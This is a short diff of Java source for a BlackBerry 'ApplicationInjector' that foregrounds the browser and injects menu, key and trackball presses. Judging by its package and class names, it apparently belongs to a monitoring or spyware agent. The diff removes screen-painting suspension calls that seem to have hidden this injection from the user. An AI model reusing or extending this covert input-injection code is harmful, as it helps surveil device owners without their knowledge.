@@ -1,17 +1,14 @@
 package blackberry.injection;
 
-import java.util.TimerTask;
-
-import blackberry.agent.im.BBMMenuItem;
-import blackberry.debug.Debug;
-import blackberry.debug.DebugLevel;
-import blackberry.utils.Utils;
-
 import net.rim.device.api.system.ApplicationDescriptor;
 import net.rim.device.api.system.ApplicationManager;
 import net.rim.device.api.system.Backlight;
 import net.rim.device.api.ui.Keypad;
 import net.rim.device.api.ui.UiApplication;
+import blackberry.agent.im.BBMMenuItem;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
+import blackberry.utils.Utils;
 
 
 public class ApplicationInjector{
@@ -94,7 +91,7 @@ public class ApplicationInjector{
 
 						int pid = manager.getProcessId(apps[i]);
 						manager.requestForeground(pid);
-						// manager.runApplication(apps[i]);
+						// manager.runApplication(apps[i]);s
 
 					}
 
@@ -103,17 +100,12 @@ public class ApplicationInjector{
 					if (manager.getProcessId(apps[i]) == foregroundProcess) {
 						debug.info("Browser foreground");
 
-						UiApplication.getUiApplication().getActiveScreen()
-								.getUiEngine().suspendPainting(true);
-
 						KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
 						// Utils.sleep(100);
 						KeyInjector.pressRawKey('z');
 						// Utils.sleep(500);
 						KeyInjector.trackBallClick();
 
-						UiApplication.getUiApplication().getActiveScreen()
-								.getUiEngine().suspendPainting(false);
 						exitBrowser = true;
 
 					}
